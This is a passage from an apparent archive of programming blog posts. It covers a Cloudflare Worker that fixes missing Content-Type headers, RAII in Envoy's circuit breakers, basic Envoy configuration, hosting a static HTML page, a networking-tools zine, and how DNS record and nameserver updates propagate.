{\n  event.respondWith(handleRequest(event.request))\n})\n\n/**\n * @param {Request} request\n */\nasync function handleRequest(request) {\n  const response = await fetch(request)\n  const content_type = response.headers.get(\"Content-Type\")\n  if (!content_type) {\n    var headers = new Headers();\n    for (var kv of response.headers.entries()) {\n      headers.append(kv[0], kv[1]);\n    }\n   \n    const url = request.url\n    console.log(\"Missing content type for url \", url)\n    headers.set(\"Content-Type\", get_content_type(url))\n    headers.set(\"x-julia-test\", \"edited headers!\")\n    response.headers = headers\n    return new Response(response.body, {\n      status: response.status,\n      statusText: response.statusText,\n      headers: headers})\n  }\n  return response\n}\n\nfunction get_content_type(url) {\n  if (url.endsWith(\".svg\")) {\n    return \"image/svg+xml\"\n  } else if (url.endsWith(\".png\")) {\n    return \"image/png\"\n  } else if (url.endsWith(\".jpg\")) {\n    return \"image/jpg\"\n  } else if (url.endsWith(\".css\")) {\n    return \"text/css\"\n  } else if (url.endsWith(\".pdf\")) {\n    return \"application/pdf\"\n  } else {\n    return \"text/html; charset=UTF-8\"\n  }\n} \n \n\n Writing this Javascript was a pretty pleasant experience – they have what looks just like a Chrome\nconsole that you can use to run & preview your code. \n\n the results: it works! \n\n Right now, Cloudflare’s cached version of  https://jvns.ca/blog/2018/09/01/learning-skills-you-can-practice/  is missing its\nContent-Type header (though this will likely have changed by the time this post goes up :)). After\ninstalling the new Content-Type header and my test  x-julia-test  header, here’s what it looks like\nwhen I  curl  the website! \n\n $ curl -I https://jvns.ca/blog/2018/09/01/learning-skills-you-can-practice/ \nHTTP/1.1 200 OK\nDate: Mon, 03 Sep 2018 14:20:11 GMT\nContent-Type: text/html; charset=UTF-8 <==== I added this one!\nConnection: keep-alive\nSet-Cookie: __cfduid=d837320682d5cd76dc435ad3be07487ae1535984411; expires=Tue, 03-Sep-19 14:20:11 GMT; path=/; domain=.jvns.ca; HttpOnly\nCF-Cache-Status: HIT\nCache-Control: public, max-age=3600\ncf-ray: 4548db09caf63f95-YUL\netag: W/\"46d9-574e4257a46f6\"\nexpect-ct: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"\nexpires: Mon, 03 Sep 2018 15:20:11 GMT\nstrict-transport-security: max-age=2592000\nvary: Accept-Encoding\nvia: e2s\nx-content-type-options: nosniff\nx-julia-test: edited headers! <==== I added this one!\nServer: cloudflare\n \n\n And if I load that page in Firefox, I can see that the headers got edited by my Cloudflare worker\n(see the  x-julia-test  header at the bottom). Neat! \n\n \n\n And, most importantly, the website displays properly instead of being a bunch of raw HTML, which was\nthe point. Amazing! \n\n logging the HTTP requests & responses \n\n I also tried adding some logging to the request workers by just making a server somewhere else that\nlogs all POST requests made to it, following the ( instructions here ). \n\n I’m now logging all the requests & responses when the workers see a 200 that’s missing a\nContent-Type header. (There are also some 304 responses missing a Content-Type header, but that’s\nnormal!). It hasn’t turned up anything yet, but maybe something will appear eventually! \n\n cloudflare workers are neat \n\n I usually don’t talk about paid services on this blog and these workers definitely aren’t free (they\ncharge $5/month for up to 10 million requests/month). But this was useful to me and I think it’s\nreally cool to be able to write arbitrary Javascript code that modifies all of my blog’s HTTP\nresponses! \n\n It’s definitely a hack – running custom javascript on every single HTTP request is an extremely\nsilly way to fix what is probably some kind of server configuration issue somewhere.  But it helps\nme fix my problem until I decide to spend the time to migrate web hosts or whatever, so I’m happy\nwith that. Paying $60/year is definitely worth it to me to fix the problem & not have to spend the\ntime to migrate to a different host right now :) \n\n Looking at the CDN landscape in general, Fastly offers a seemingly similar feature called the  Edge SDK  that lets you write VCL (“varnish configuration\nlanguage”). I haven’t used that though. \n\n"},
{"url": "https://jvns.ca/blog/2018/11/18/c---destructors---really-useful/", "title": "An example of how C++ destructors are useful in Envoy", "content": "\n     \n\n For a while now I’ve been working with a C++ project (Envoy), and sometimes I need to contribute to\nit, so my C++ skills have gone from “nonexistent” to “really minimal”. I’ve learned what an\ninitializer list is and that a method starting with  ~  is a destructor. I almost know what an\nlvalue and an rvalue are but not quite. \n\n But the other day when writing some C++ code I figured out something exciting about how to use\ndestructors that I hadn’t realized! (the tl;dr of this post for people who know C++ is “julia\nfinally understands what RAII is and that it is useful” :)) \n\n what’s a destructor? \n\n C++ has objects. When an C++ object goes out of scope, the compiler inserts a call to its\ndestructor. So if you have some code like \n\n function do_thing() {\n  Thing x{}; // this calls the Thing constructor\n  return 2;\n}\n \n\n there will be a call to x’s destructor at the end of the  do_thing  function. so the code c++\ngenerates looks something like: \n\n \n make new thing \n call the new thing’s destructor \n return 2 \n \n\n Obviously destructors are way more complicated like this. They need to get called when there are\nexceptions! And sometimes they get called manually. And for lots of other reasons too. But there are\n10 million things to know about C++ and that is not what we’re doing today, we are just talking\nabout one thing. \n\n what happens in a destructor? \n\n A lot of the time memory gets freed, which is how you avoid having memory leaks. But that’s not what\nwe’re talking about in this post! We are talking about something more interesting. \n\n the thing we’re interested in: Envoy circuit breakers \n\n So I’ve been working with Envoy a lot.  3 second Envoy refresher: it’s a HTTP proxy, your application\nmakes requests to Envoy, which then proxies the request to the servers the application wants to talk\nto. \n\n One very useful feature Envoy has is this thing called “circuit breakers”.  Basically the idea with\nis that if your application makes 50 billion connections to a service, that will probably overwhelm\nthe service. So Envoy keeps track how many TCP connections you’ve made to a service, and will stop you from making\nnew requests if you hit the limit. The default  max_connection  limit \n\n how do you track connection count? \n\n To maintain a circuit breaker on the number of TCP connections, that means you need to keep an\naccurate count of how many TCP connections are currently open! How do you do that? Well, the way it\nworks is to maintain a  connections  counter and: \n\n \n every time a connection is opened, increment the counter \n every time a connection is destroyed (because of a reset / timeout / whatever), decrement the\ncounter \n when creating a new connection, check that the  connections  counter is not over the limit \n \n\n that’s all! And incrementing the counter when creating a new connection is pretty easy. But how do\nyou make sure that the counter gets  decremented  when the connection is destroyed? Connections can\nbe destroyed in a lot of ways (they can time out! they can be closed by Envoy! they can be closed by\nthe server! maybe something else I haven’t thought of could happen!) and it seems very easy to\naccidentally miss a way of closing them. \n\n destructors to the rescue \n\n The way Envoy solves this problem is to create a connection object (called\n ActiveClient  in the HTTP connection pool) for every connection. \n\n Then it: \n\n \n increments the counter in the constructor ( code ) \n decrements the counter in the destructor ( code ) \n checks the counter when a new connection is created ( code ) \n \n\n The beauty of this is that now you don’t need to make sure that the counter gets decremented in all\nthe right places, you now just need to organize your code so that the  ActiveClient  object’s\ndestructor gets called when the connection has closed. \n\n Where does the  ActiveClient  destructor get called in Envoy? Well, Envoy maintains 2 lists of\nclients ( ready_clients  and  busy_clients ), and when a connection gets closed, Envoy removes the\nclient from those lists. And when it does that, it doesn’t need to do any extra cleanup!!  In C++,\nanytime an object is removed from a list, its destructor is called. So\n client.removeFromList(ready_clients_);  takes care of all the cleanup. And there’s no chance of\nforgetting to decrement the counter!! It will definitely always happen unless you accidentally leave\nthe object on one of these lists, which would be a bug anyway because the connection is closed :) \n\n RAII \n\n This pattern Envoy is using here is an extremely common C++ programming pattern called “resource\nacquisition is initialization”. I find that name very confusing but that’s what it’s called.\nbasically the way it works is: \n\n \n identify a resource (like “connection”) where a lot of things need to happen when the connection\nis initialized / finished \n make a class for that connection \n put all the initialization / finishing code in the constructor / destructor \n make sure the object’s destructor method gets called when appropriate! (by removing it from a\nvector / having it go out of scope) \n \n\n Previously I knew about using this pattern for kind of obvious things (make sure all the memory\ngets freed in the destructor, or make sure file descriptors get closed). But I didn’t realize it was\nalso useful for cases that are slightly less obviously a resource like “decrement a counter”. \n\n The reason this pattern works is because the C++ compiler/standard library does a bunch of work to\nmake sure that destructors get called when you’re done with an object – the compiler inserts\ndestructor calls at the end of each block of code, after exceptions, and many standard library\ncollections make sure destructors are called when you remove an object from a collection. \n\n RAII gives you prompt, deterministic, and hard-to-screw-up cleanup of resources \n\n The exciting thing here is that this programming pattern gives you a way to schedule cleaning up\nresources that’s: \n\n \n easy to ensure always happens (when the object goes away, it always happens, even if there was an\nexception!) \n prompt & deterministic (it happens right away and it’s guaranteed to happen!) \n \n\n what languages have RAII? \n\n C++ and Rust have RAII. Probably other languages too. Java, Python, Go, and garbage collected\nlanguages in general do not.  In a garbage collected language you can often set up destructors to be\nrun when the object is GC’d. But often (like in this case, which the connection count) you want\nthings to be cleaned up  right away  when the object is no longer in use, not some indeterminate\nperiod later whenever GC happens to run. \n\n Python context managers are a related idea, you could do something like: \n\n with conn_pool.connection() as conn:\n    do stuff\n \n\n that’s all for now! \n\n Hopefully this explanation of RAII is interesting and mostly correct. Thanks to Kamal for clarifying\nsome RAII things for me! \n\n"},
{"url": "https://jvns.ca/blog/2018/10/27/envoy-basics/", "title": "Some Envoy basics", "content": "\n     \n\n Envoy  is a newish network proxy/webserver in the same universe as HAProxy and nginx. When I first\nlearned about it around last fall, I was pretty confused by it. \n\n There are a few kinds of questions one might have about any piece of software: \n\n \n how does do you use it? \n why is it useful? \n how does it work internally? \n \n\n I’m going to spend most of my time in this post on “how do you use it?”, because I found a lot of\nthe basics about how to configure Envoy very confusing when I started. I’ll explain some of the\nEnvoy jargon that I was initially confused by (what’s an SDS? XDS? CDS? EDS?  ADS? filter? cluster?\nlistener? help!) \n\n There will also be a little bit of “why is it useful?” and nothing at all about the internals. \n\n What’s Envoy? \n\n Envoy is a network proxy. You compile it, you put it on the server that you want the, you tell it\nwhich configuration file to use it, and away you go! \n\n Here’s probably the simplest possible example of using Envoy. The configuration file is  a gist .\nThis example starts a webserver on port 7777 that proxies to another HTTP server on port 8000. \n\n If you have Docker, you can try it now – just download the configuration, start the Envoy docker\nimage, and away you go! \n\n python -mSimpleHTTPServer & # Start a HTTP server on port 8000\nwget https://gist.githubusercontent.com/jvns/340e4d20c83b16576c02efc08487ed54/raw/1ddc3038ed11c31ddc70be038fd23dddfa13f5d3/envoy_config.json\ndocker run --rm --net host -v=$PWD:/config envoyproxy/envoy /usr/local/bin/envoy -c /config/envoy_config.json\n \n\n This will start an Envoy HTTP server, and then you can make a request to Envoy! Just  curl\nlocalhost:7777  and it’ll proxy the request to  localhost:8000 . \n\n Envoy basic concepts: clusters, listeners, routes, and filters \n\n This small tiny\n envoy_config.json \nwe just ran contains all the basic Envoy concepts! \n\n First, there’s a  listener . This tells Envoy to bind to a port, in this case 7777: \n\n \"listeners\": [{\n  \"address\": { \n     \"socket_address\": { \"address\": \"127.0.0.1\", \"port_value\": 7777 } \n \n\n Next up, the listener has  filters . Filters tell the listener what to do with the requests it receives,\nand you give Envoy an array of filters. If you’re doing something complicated typically you’ll apply\nseveral filters to every requests coming in. \n\n There are a few different kinds of filters ( see list of TCP filters ), but the most important filter is probably the  envoy.http_connection_manager  filter, which is used for proxying HTTP requests. The HTTP connection manager has a further list of HTTP filters that it applies ( see list of HTTP filters ). The most important of those is the  envoy.router  filter which routes requests to the right backend. \n\n In our example, here’s how we’ve configured our filters. There’s one TCP filter\n( envoy.http_connection_manager ) which uses 1 HTTP filter ( envoy.router ) \n\n \"filters\": [\n {\n   \"name\": \"envoy.http_connection_manager\",\n   \"config\": {\n     \"stat_prefix\": \"ingress_http\",\n     \"http_filters\": [{ \"name\": \"envoy.router\", \"config\": {} }],\n....\n \n\n Next, let’s talk about  routes . You’ll notice that so far we haven’t explained to the\n envoy.router  filter what to  do  with the requests it receives. Where should it proxy them? What\npaths should it match? In our case, the answer to that question is going to be “proxy all requests\nto localhost:8000”. \n\n The  envoy.router  filter is configured with an array of routes. Here’s how they’re configured in\nour test configuration. In our case there’s just one route. \n\n \"route_config\": {\n  \"virtual_hosts\": [\n    {\n      \"name\": \"blah\",\n      \"domains\": \"*\",\n      \"routes\": [\n        {\n          \"match\": { \"prefix\": \"/\" },\n          \"route\": { \"cluster\": \"banana\" }\n \n\n This gives a list of domains to match (these are matched against the requests Host header).  If we\nchanged  \"domains\": \"*\"  to  \"domains\": \"my.cool.service\" , then we’d need to pass the header  Host:\nmy.cool.service  to get a response. \n\n If you’re paying attention to the ongoing saga of this configuration, you’ll notice that the port\n 8000  hasn’t been mentioned anywhere. There’s just  \"cluster\": \"banana\" . What’s a cluster? \n\n Well, a  cluster  is a collection of address (IP address / port) that are the backend for a\nservice. For example, if you have 8 machines running a HTTP service, then you might have 8 hosts in\nyour cluster. Every service needs its own cluster. This example cluster is really simple: it’s just\na single IP/port, running on localhost. \n\n   \"clusters\":[\n    {\n      \"name\": \"banana\",\n      \"type\": \"STRICT_DNS\",\n      \"connect_timeout\": \"1s\",\n      \"hosts\": [\n        { \"socket_address\": { \"address\": \"127.0.0.1\", \"port_value\": 8000 } }\n      ]\n    }\n  ]\n \n\n tips for writing Envoy configuration by hand \n\n I find writing Envoy configurations from scratch pretty time consuming – there are some examples in\nthe Envoy repository ( https://github.com/envoyproxy/envoy ), but even after using Envoy for a year\nthis basic configuration actually took me 45 minutes to get right. Here are a few tips: \n\n \n Envoy has 2 different APIs: the v1 and the v2 API. Many newer features are only available in the\nv2 API, and I find its documentation a little easier to navigate because it’s automatically\ngenerated from protocol buffers. (eg the Cluster docs are generated from  cds.proto ) \n A few good starting points in the Envoy API docs:  Listener ,  Cluster ,  Filter ,   Virtual Host . To get all the information you need you need to click a lot (for example to see how to configure the cluster for a route you need to start at “Virtual Host” and click route_config -> virtual_hosts -> routes -> route -> cluster), but it works. \n The  architecture overview docs  are useful and give an overall explanation of how some Envoy things are configured. \n You can use either json or yaml to configure Envoy. Above I’ve used JSON. \n \n\n You can configure Envoy with a server \n\n Even though we started with a configuration file on disk, one thing that makes Envoy really\ndifferent from HAProxy or nginx is that Envoy often  isn’t configured with a configuration file .\nInstead, you can configure Envoy with one or several configuration  servers  which dynamically\nchange your configuration. \n\n To get an idea of why this might be useful: imagine that you’re using Envoy to load balance requests\nto 50ish backend servers, which are EC2 instances that you periodically rotate out. So\n http://your-website.com  requests go to Envoy, and get routed to an Envoy  cluster , which needs to\nbe a list of the 50 IP addresses and ports of those servers. \n\n But what if those servers change over time? Maybe you’re launching new ones or they’re getting\nterminated. You could handle this by periodically changing the Envoy configuration file and\nrestarting Envoy. Or!! You could set up a “cluster discovery service” (or “CDS”), which for example\ncould query the AWS API and return all the IPs of your backend servers to Envoy. \n\n I’m not going to get into the details of how to configure a discovery service, but basically it\nlooks like this (from  this template ). You tell it how often to refresh and what the address of the server is. \n\n dynamic_resources:\n  cds_config:\n    api_config_source:\n      cluster_names:\n      - cds_cluster\n      refresh_delay: 30s\n...\n  - name: cds_cluster\n    connect_timeout: 0.25s\n    type: STRICT_DNS\n    lb_policy: ROUND_ROBIN\n    hosts:\n    - socket_address:\n        protocol: TCP\n        address: cds.yourcompany.net\n        port_value: 80\n \n\n 4 kinds of Envoy discovery services \n\n There are 4 kinds of resources you can set up discovery services for Envoy – routes (“what cluster\nshould requests with this HTTP header go to”), clusters (“what backends does this service have?”),\nlistener (the filters for a port), and endpoints. These are called RDS, CDS, LDS, and EDS\nrespectively.  XDS  is the\noverall protocol. \n\n The easiest way to write a discovery service from scratch is probably in Go using the\n go-control-plane  library. \n\n some Envoy discovery services \n\n It’s definitely possible to write Envoy configuration services from scratch, but there are some\nother open source projects that implement Envoy discovery services. Here are the ones I know about,\nthough I’m sure there are more: \n\n \n There’s an open source Envoy discovery service called  rotor  which looks interesting. The company that built it just  shut down  a couple weeks ago. \n Istio  (as far as I understand it) is  basically an Envoy discovery service\nthat uses information from the Kubernetes API (eg the services in your cluster) to configure Envoy\nclusters/routes. It has its own configuration language. \n consul might be adding support for Envoy (see  this blog post ), though I don’t fully understand\nthe status there \n \n\n what’s a service mesh? \n\n Another term that I hear a lot is “service mesh”. Basically a “service mesh” is where you install\nEnvoy on the same machine as every one of your applications, and proxy all your network requests\nthrough Envoy. \n\n Basically it gives you more easily control how a bunch of different applications (maybe written in\ndifferent programming languages) communicate with each other. \n\n why is Envoy interesting? \n\n I think these discovery services are really the exciting thing about Envoy. If all of your network\ntraffic is proxied through Envoy and you control all Envoy configuration from a central server, then\nyou can potentially: \n\n \n use  circuit breaking \n route requests to  only close instances \n encrypt network traffic end-to-end \n run controlled code rollouts (want to send only 20% of traffic to the new server you spun up? okay!) \n \n\n all without having to change any application code anywhere. Basically it’s a very powerful/flexible\ndecentralized load balancer. \n\n Obviously setting up a bunch of discovery services and operating them and using them to configure\nyour internal network infrastructure in complicated ways is a lot more work than just “write an\nnginx configuration file and leave it alone”, and it’s probably more complexity than is appropriate\nfor most people. I’m not going to venture into telling you who should or should not use Envoy, but\nmy experience has been that, like Kubernetes, it’s both very powerful and very complicated. \n\n other exciting things about Envoy: timeout headers and metrics \n\n One of the things I really like about Envoy is that you can pass it a HTTP header to tell it how to\nretry/timeout your requests!! This is amazing because implementing timeout / retry logic correctly\nworks differently in every programming language and people get it wrong ALL THE TIME. So being able\nto just pass a header is great. \n\n The timeout & retry headers are documented  here , and here are my favourites: \n\n \n x-envoy-max-retries : how many times to retry \n x-envoy-retry-on : which failures to retry (eg  5xx  or  connect-failure ) \n x-envoy-upstream-rq-timeout-ms : total timeout \n x-envoy-upstream-rq-per-try-timeout-ms : timeout per retry \n \n\n that’s all for now \n\n I have a lot of thoughts about Envoy (too many to write in one blog post!), so maybe I’ll say more\nlater! \n\n"},
{"url": "https://jvns.ca/blog/2019/09/06/how-to-put-an-html-page-on-the-internet/", "title": "How to put an HTML page on the internet", "content": "\n     \n\n One thing I love about the internet is that it’s SO EASY to put static HTML websites on the\ninternet.  Someone asked me today how to do it, so I thought I’d write down how really quickly! \n\n just an HTML page \n\n All of my sites are just static HTML and CSS. My web design skills are relatively minimal\n( https://wizardzines.com  is the most complicated site I’ve developed on my own), so keeping all my\ninternet sites relatively simple means that I have some hope of being able to make changes / fix\nthings without spending a billion hours on it. \n\n So we’re going to take as minimal of an approach as possible in this blog post – just one HTML page. \n\n the HTML page \n\n The website we’re going to put on the internet is just one file, called  index.html . You can find it\nat  https://github.com/jvns/website-example , which is a\nGithub repository with exactly one file in it. \n\n The HTML file has some CSS in it to make it look a little less boring, which is partly copied from\n https://example.com . \n\n how to put the HTML page on the internet \n\n Here are the steps: \n\n \n sign up for a  Neocities  account \n copy the index.html into the index.html in your neocities site \n done \n \n\n The index.html page above is on the internet at\n julia-example-website.neocities.com , if you view source you’ll see that it’s\nthe same HTML as in the github repo. \n\n I think this is probably the simplest way to put an HTML page on the internet (and it’s a throwback\nto Geocities, which is how I made my first website in 2003) :). I also like that Neocities (like\n glitch , which I also love) is about experimentation and learning and having\nfun.. \n\n other options \n\n This is definitely not the only easy way – Github pages and Gitlab pages and Netlify will all automatically\npublish a site when you push to a Git repository, and they’re all very easy to use (just connect\nthem to your github repository and you’re done). I personally use the Git repository approach\nbecause not having things in Git makes me nervous – I like to know what changes to my website I’m\nactually pushing. But I think if you just want to put an HTML site on the internet for the first\ntime and play around with HTML/CSS, Neocities is a really nice way to do it. \n\n If you want to actually use your website for a Real Thing and not just to play around you probably\nwant to buy a domain and link it to your website so that you can change hosting providers in the\nfuture, but that is a bit less simple. \n\n this is a good possible jumping off point for learning HTML \n\n If you are a person who is comfortable editing files in a Git repository but wants to practice\nHTML/CSS, I think this is a fun way to put a website on the internet and play around! I really like\nthe simplicity of it – there’s literally just one file, so there’s no fancy extra magic to get in the\nway of understanding what’s going on. \n\n There are also a bunch of ways to complicate/extend this, like this blog is actually generated with\n Hugo  which generates a bunch of HTML files which then go on the internet, but\nit’s always nice to start with the basics. \n\n"},
{"url": "https://jvns.ca/blog/2019/02/10/a-few-networking-tool-comics/", "title": "Networking tool comics!", "content": "\n      Hello! I haven’t been blogging too much recently because I’m working on a new  zine  project: Linux\nnetworking tools! \n\n I’m pretty excited about this one – I LOVE computer networking (it’s what I spent a big chunk of\nthe last few years at work doing), but getting started with all the tools was originally a little\ntricky! For example – what if you have the IP address of a server and you want to make a https\nconnection to it and check that it has a valid certificate? But you haven’t changed DNS to resolve\nto that server yet (because you don’t know if it works!) so you need to use the IP address? If you do\n curl https://1.2.3.4/ , curl will tell you that the certificate isn’t valid (because it’s not valid\nfor 1.2.3.4). So you need to know to do  curl https://jvns.ca --resolve jvns.ca:443:104.198.14.52 . \n\n I know how to use  curl --resolve  because my coworker told me how. And I learned that to find out\nwhen a cert expires you can do  openssl x509 -in YOURCERT.pem  -text -noout  the same way. So the\ngoal with this zine is basically to be “your very helpful coworker who gives you tips about how to\nuse networking tools” in case you don’t have that person. \n\n And as we know, a lot of these tools have VERY LONG man pages and you only usually need to know\nlike 5 command line options to do 90% of what you want to do. For example I only ever do maybe 4\nthings with openssl even though the openssl man pages together have more than 60,000 words. \n\n There are a few things I’m also adding (like ethtool and nmap and tc) which I don’t personally use\nsuper often but I think are super useful to people with different jobs than me. And I’m a big fan of\nmixing more advanced things (like tc) with basic things (like ssh) because then even if you’re\nlearning the basic things for the first time, you can learn that the advanced thing exists! \n\n Here’s some work in progress: \n\n \n \n \n \n \n \n \n \n\n It’s been super fun to draw these: I didn’t know about  ssh-copy-id  or  ~.  before I made that ssh\ncomic and I really wish I’d known about them earlier! \n\n As usual I’ll announce the zine when it comes out here, or you can sign up for announcements at\n https://wizardzines.com/mailing-list/ . \n\n"},
{"url": "https://jvns.ca/blog/how-updating-dns-works/", "title": "What happens when you update your DNS?", "content": "\n     \n\n I’ve seen a lot of people get confused about updating their site’s DNS records\nto change the IP address. Why is it slow? Do you really have to wait 2 days for\neverything to update? Why do some people see the new IP and some people see the\nold IP? What’s happening? \n\n So I wanted to write a quick exploration of what’s happening behind the scenes\nwhen you update a DNS record. \n\n how DNS works: recursive vs authoritative DNS servers \n\n First, we need to explain a little bit about DNS. There are 2 kinds of DNS\nservers:  authoritative  and  recursive . \n\n authoritative  DNS servers (also known as  nameservers ) have a database\nof IP addresses for each domain they’re responsible for. For example, right now\nan authoritative DNS server for github.com is ns-421.awsdns-52.com. You can ask it for github.com’s IP like this; \n\n dig @ns-421.awsdns-52.com github.com\n \n\n recursive  DNS servers, by themselves, don’t know anything about who owns\nwhat IP address. They figure out the IP address for a domain by asking\nthe right authoritative DNS servers, and then cache that IP address in case they’re asked\nagain. 8.8.8.8 is a recursive DNS server. \n\n When people visit your website, they’re probably making their DNS queries to a\nrecursive DNS server. So, how do recursive DNS servers work? Let’s see! \n\n how does a recursive DNS server query for github.com? \n\n Let’s go through an example of what a recursive DNS server (like 8.8.8.8) does\nwhen you ask it for an IP address (A record) for github.com. First – if it\nalready has something cached, it’ll give you what it has cached. But what if\nall of its caches are expired? Here’s what happens: \n\n step 1 : it has IP addresses for the root DNS servers hardcoded in its source code. You can see this in  unbound’s source code here . Let’s say it picks   198.41.0.4  to start with. Here’s the  official source  for those hardcoded IP addresses, also known as a “root hints file”. \n\n step 2 : Ask the root nameservers about  github.com . \n\n We can roughly reproduce what happens with  dig . What this gives us is a new\nauthoritative nameserver to ask: a nameserver for  .com , with the IP  192.5.6.30 . \n\n $ dig @198.41.0.4 github.com\n...\ncom.\t\t\t172800\tIN\tNS\ta.gtld-servers.net.\n...\na.gtld-servers.net.\t172800\tIN\tA\t192.5.6.30\n...\n \n\n The details of the DNS response are a little more complicated than that – in\nthis case, there’s an authority section with some NS records and an additional\nsection with A records so you don’t need to do an extra lookup to get the IP\naddresses of those nameservers. \n\n (in practice, 99.99% of the time it’ll already have the address of the  .com  nameservers cached, but we’re pretending we’re really starting from scratch) \n\n step 3 : Ask the  .com  nameservers about  github.com . \n\n $ dig @192.5.6.30 github.com\n...\ngithub.com.\t\t172800\tIN\tNS\tns-421.awsdns-52.com.\nns-421.awsdns-52.com.\t172800\tIN\tA\t205.251.193.165\n...\n \n\n We have a new IP address to ask! This one is the nameserver for  github.com . \n\n step 4 : Ask the  github.com  nameservers about  github.com . \n\n We’re almost done! \n\n $ dig @205.251.193.165 github.com\n\ngithub.com.\t\t60\tIN\tA\t140.82.112.4\n \n\n Hooray!! We have an  A  record for  github.com ! Now the recursive nameserver\nhas  github.com ’s IP address and can return it back to you. And it could do\nall of this by only hardcoding a few IP addresses: the addresses of the root\nnameservers. \n\n how to see all of a recursive DNS server’s steps:  dig +trace \n\n When I want to see what a recursive DNS server would do when resolving a\ndomain, I run \n\n $ dig @8.8.8.8 +trace github.com\n \n\n This shows all the DNS records that it requests, starting at the root DNS\nservers – all the 4 steps that we just went through. \n\n let’s update some DNS records! \n\n Now that we know the basics of how DNS works, let’s update some DNS records and see\nwhat happens. \n\n When you update your DNS records, there are two main options: \n\n \n keep the same nameservers \n change nameservers \n \n\n let’s talk about TTLs \n\n We’ve forgotten something important though! TTLs! You know how\nwe said earlier that the recursive DNS server will cache records until they\nexpire?  The way it decides whether the record should expire is by looking at\nits  TTL  or “time to live”. \n\n In this example, the TTL for the A record github’s nameserver returns for its\nDNS record is  60 , which means 60 seconds: \n\n $ dig @205.251.193.165 github.com\n\ngithub.com.\t\t60\tIN\tA\t140.82.112.4\n \n\n That’s a pretty short TTL, and  in theory  if everybody’s DNS implementation\nfollowed the  DNS standard  it means that\nif Github decided to change the IP address for  github.com , everyone should\nget the new IP address\nwithin 60 seconds. Let’s see how that plays out in practice \n\n option 1: update a DNS record on the same nameservers \n\n First, I updated my nameservers (Cloudflare) to have a new DNS record: an A record that maps\n test.jvns.ca  to  1.2.3.4 . \n\n $ dig @8.8.8.8 test.jvns.ca\ntest.jvns.ca.\t\t299\tIN\tA\t1.2.3.4\n \n\n This worked immediately! There was no need to wait at all, because there was no\n test.jvns.ca  DNS record before that could have been cached. Great. But it\nlooks like the new record is cached for ~5 minutes (299 seconds). \n\n So, what if we try to change that IP? I changed it to  5.6.7.8 , and then ran the same DNS query. \n\n $ dig @8.8.8.8 test.jvns.ca\ntest.jvns.ca.\t\t144\tIN\tA\t1.2.3.4\n \n\n Hmm, it seems like that DNS server has the  1.2.3.4  record still cached for\nanother 144 seconds. Interestingly, if I query  8.8.8.8  multiple times I actually get\ninconsistent results – sometimes it’ll give me the new IP and sometimes the\nold IP, I guess because 8.8.8.8 actually load balances to a bunch of different\nbackends which each have their own cache. \n\n After I waited 5 minutes, all of the  8.8.8.8  caches had updated and were\nalways returning the new  5.6.7.8  record. Awesome. That was pretty fast! \n\n you can’t always rely on the TTL \n\n As with most internet protocols, not everything obeys the DNS specification.\nSome ISP DNS servers will cache records for longer than the TTL specifies, like\nmaybe for 2 days instead of 5 minutes. And people can always hardcode the old\nIP address in their /etc/hosts. \n\n What I’d expect to happen in practice when updating a DNS record with a 5\nminute TTL is that a large percentage of clients will move over to the new IPs\nquickly (like within 15 minutes), and then there will be a bunch of stragglers\nthat slowly update over the next few days. \n\n option 2: updating your nameservers \n\n So we’ve seen that when you update an IP address without changing your\nnameservers, a lot of DNS servers will pick up the new IP pretty quickly.\nGreat. But what happens if you change your nameservers? Let’s try it! \n\n I didn’t want to update the nameservers for my blog, so instead I went with a\ndifferent domain I own and use in the examples for the  HTTP\nzine :  examplecat.com . \n\n Previously, my nameservers were set to dns1.p01.nsone.net. I decided to switch\nthem over to Google’s nameservers –  ns-cloud-b1.googledomains.com  etc. \n\n When I made the change, my domain registrar somewhat ominously popped up the\nmessage – “Changes to examplecat.com saved. They’ll take effect within the\nnext 48 hours”. Then I set up a new A record for the domain, to make it point to  1.2.3.4 \n\n Okay, let’s see if that did anything \n\n $ dig @8.8.8.8 examplecat.com\nexamplecat.com.\t\t17\tIN\tA\t104.248.50.87\n \n\n No change. If I ask a different DNS server, it knows the new IP: \n\n $ dig @1.1.1.1 examplecat.com\nexamplecat.com.\t\t299\tIN\tA\t1.2.3.4\n \n\n but 8.8.8.8 is still clueless. The reason 1.1.1.1 sees the new IP even though\nI just changed it 5 minutes ago is presumably that nobody had ever queried\n1.1.1.1 about examplecat.com before, so it had nothing in its cache. \n\n nameserver TTLs are much longer \n\n The reason that my registrar was saying “THIS WILL TAKE 48 HOURS” is that the TTLs\non NS records (which are how recursive nameservers know which nameserver to\nask) are MUCH longer! \n\n The new nameserver is definitely returning the new IP address for\n examplecat.com \n\n $ dig @ns-cloud-b1.googledomains.com examplecat.com\nexamplecat.com.\t\t300\tIN\tA\t1.2.3.4\n \n\n But remember what happened when we queried for the  github.com  nameservers, way back? \n\n $ dig @192.5.6.30 github.com\n...\ngithub.com.\t\t172800\tIN\tNS\tns-421.awsdns-52.com.\nns-421.awsdns-52.com.\t172800\tIN\tA\t205.251.193.165\n...\n \n\n 172800 seconds is 48 hours! So nameserver updates will in general take a lot\nlonger to expire from caches and propagate than just updating an IP address\nwithout changing your nameserver. \n\n how do your nameservers get updated? \n\n When I update the nameservers for  examplecat.com , what happens is that he\n .com  nameserver gets a new  NS  record with the new domain. Like this: \n\n dig ns @j.gtld-servers.net examplecat.com\n\nexamplecat.com.\t\t172800\tIN\tNS\tns-cloud-b1.googledomains.com\n \n\n But how does that new NS record get there? What happens is that I tell my\n domain registrar  what I want the new nameservers to be by updating it on\nthe website, and then my domain registrar tells the  .com  nameservers to make\nthe update. \n\n For  .com , these updates happen pretty fast (within a few minutes), but I\nthink for some other TLDs the TLD nameservers might not apply updates as quickly. \n\n your program’s DNS resolver library might also cache DNS records \n\n One more reason TTLs might not be respected in practice: many programs need to\nresolve DNS names, and some programs will also cache DNS records indefinitely\nin memory (until the program is restarted). \n\n For example, AWS has an article on  Setting the JVM TTL for DNS Name\nLookups .\nI haven’t written that much JVM code that does DNS lookups myself, but from a\nlittle Googling about the JVM and DNS it seems like you can configure the\nJVM so that it caches every DNS lookup indefinitely. (like  this elasticsearch issue ) \n\n that’s all! \n\n I hope this helps you understand what’s going on when updating your DNS! \n\n As a disclaimer, again – TTLs definitely don’t tell the whole story about DNS\npropagation – some recursive DNS servers definitely don’t respect TTLs, even\nif the major ones like 8.8.8.8 do. So even if you’re just updating an A record\nwith a short TTL, it’s very possible that in practice you’ll still get some\nrequests to the old IP for a day or two. \n\n Also, I changed the nameservers for  examplecat.com  back to their old values\nafter publishing this post. 